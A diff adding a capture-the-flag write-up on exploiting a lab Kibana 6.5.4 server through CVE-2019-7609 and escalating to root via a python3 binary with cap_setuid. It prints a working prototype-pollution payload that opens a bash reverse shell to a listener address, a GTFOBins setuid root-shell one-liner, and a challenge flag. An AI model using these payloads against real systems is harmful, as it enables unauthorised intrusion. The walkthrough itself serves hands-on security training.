@@ -1,0 +1,57 @@
+IP : 10.10.220.72
+
+Open Ports : 22,80,5044,5601
+
+Enumeration 
+	80 - Web:
+		Nothing much here
+	DirSearch:
+		Nothing here as well
+
+	5601:
+		Found Kibana on it, lets check that out what it is.
+
+		Just googling for kibana we found that it is a data vizualization dashboard for elastic search
+
+Enumerate Kibana:
+	Lets go to the application.
+	For version lets go to management tab : 6.5.4
+	For CVE lets check exploit db:
+		No matching records,
+	Lets google for the same : 
+		CVE-2019-7609 : RCE
+	We can find the exploit on Github, lets download it.
+	Lets try it : it checks out that the host may be vulnerable.
+	Lets check for the payloads on the slides:
+		.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.9.241.177/4444 0>&1\'");//')
+		.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
+	Lets move to the canvas tab after running.
+	We got a shell.
+	Lets get to user kiba folder and get user's flag : THM{1s_easy_pwn3d_k1bana_w1th_rce}
+
+Privesc:
+	Capabilities is a concept that provides a security system that allows “divide” root privileges into different values
+	
+kiba@ubuntu:/home/kiba$ getcap -r / 2> /dev/null
+getcap -r / 2> /dev/null
+/home/kiba/.hackmeplease/python3 = cap_setuid+ep
+/usr/bin/mtr = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
+kiba@ubuntu:/home/kiba$ 
+	
+We found that there is a custom python3 installed in location : /home/kiba/.hackmeplease/python3 = cap_setuid+ep
+
+Lets search GTFOBins for python:
+	cp $(which python) .
+	sudo setcap cap_setuid+ep python
+
+	./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+using this lets run what we have:
+	/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+We got a root shell.
+
+Lets get the flag
+	
